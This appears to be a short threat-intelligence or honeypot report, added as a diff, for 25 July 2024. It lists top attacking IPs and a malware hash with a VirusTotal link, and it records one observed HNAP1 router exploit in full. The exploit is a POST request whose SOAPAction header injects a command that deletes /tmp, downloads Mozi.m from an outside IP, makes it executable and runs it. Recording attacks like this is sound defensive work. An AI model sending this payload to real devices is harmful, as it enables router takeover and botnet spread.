@@ -1,0 +1,24 @@
+Top 5 IPs for 25-07-2024 :
+
+183.196.189.246
+82.102.165.62
+24.127.203.215
+61.138.165.226
+146.190.101.111
+
+Malware Observed:
+
+File name : xinetd
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+Commands/exploits observed:
+
+POST /HNAP1/ HTTP/1.0
+Host: <host IP>
+Content-Type: text/xml; charset="utf-8"
+SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://117.248.160.57:54508/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+Content-Length: 640
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>
